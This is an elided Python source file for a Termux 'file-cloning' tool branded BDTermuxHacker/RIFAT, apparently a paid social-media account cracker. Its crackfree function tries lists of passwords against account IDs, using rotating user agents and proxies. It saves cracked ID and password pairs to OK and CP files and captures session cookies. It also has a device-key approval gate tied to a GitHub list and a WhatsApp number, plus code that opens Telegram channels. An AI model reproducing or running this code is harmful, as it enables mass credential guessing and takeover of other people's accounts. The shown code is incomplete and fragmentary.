...
time.sleep(2)
#os.system('clear')
print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m JOIN MY TELEGRAM CHENNAL ..!")
os.system("espeak -a 300 \"JOIN,MY,TELEGRAM,CHENNAL,\"")
time.sleep(2)
os.system(f'xdg-open https://t.me/BDTermuxHacker/')
os.system(f'xdg-open https://t.me/BDTermuxHacker12/')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/BDTermuxHacker12/BTH-Clone/blob/main/prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/BDTermuxHacker12/BTH-Clone/blob/main/rifat.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://t.me/BDTermuxHacker')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://t.me/BDTermuxHacker12')
logo =(f"""
     \x1b[38;5;195m╔═════════════════════════════════╗
     \x1b[38;5;195m║      \33[1;33m d8888b.           \33[1;36m.d8888.\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88  `8D          \33[1;36m88'  YP\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88oobY'           \33[1;36m`8bo.\x1b[38;5;195m        ║\x1b[38;5;196m   
     \x1b[38;5;195m║      \33[1;33m 88`8b             \33[1;36m`Y8b.\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88 `88.     \33[1;36mdb   8D\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m║      \33[1;33m 88   YD      \33[1;36m`8888Y'\x1b[38;5;195m      ║\x1b[38;5;196m 
     \x1b[38;5;195m╚═════════════════════════════════╝ 
     \x1b[38;5;195m╔═════════════════════════════════╗
                 ONLY PAID USER                             
     \x1b[38;5;195m╚═════════════════════════════════╝                                                      
...
[] TOOLS        :     FILE-CLONING
[] TYPE         :     PREMIUM
[] TELEGRAM     :     BDTermuxHacker
[] VERSION      :     1.0
[] TOOLS OWNER    :     MD Rifat Hasan
\33[1;32m──────────────────────────────────────────────────""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/BDTermuxHacker12/BTH-Clone/blob/main/approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801705109807?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  RIFAT ,  V I P,  Tools"')
def back():
	login()
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[RIFAT-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mRIFAT-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•RIFAT-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " RIFAT,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
